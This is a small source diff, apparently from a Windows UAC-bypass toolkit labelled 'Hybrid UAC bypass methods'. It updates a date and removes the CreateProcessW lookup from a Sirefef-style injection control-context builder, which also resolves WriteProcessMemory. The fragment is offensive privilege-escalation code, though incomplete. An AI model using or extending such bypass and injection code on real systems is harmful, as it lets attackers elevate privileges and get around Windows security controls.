@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.70
 *
-*  DATE:        25 Mar 2017
+*  DATE:        19 Apr 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -459,11 +459,6 @@ PZA_CONTROL_CONTEXT ucmSirefefBuildControlContext(
         if (Routine == NULL)
             break;
         ctx->pWaitForSingleObject = RtlEncodePointer(Routine);
-
-        Routine = supNativeGetProcAddress(KERNEL32_DLL, "CreateProcessW");
-        if (Routine == NULL)
-            break;
-        ctx->pCreateProcess = RtlEncodePointer(Routine);
 
         Routine = supNativeGetProcAddress(KERNEL32_DLL, "WriteProcessMemory");
         if (Routine == NULL)
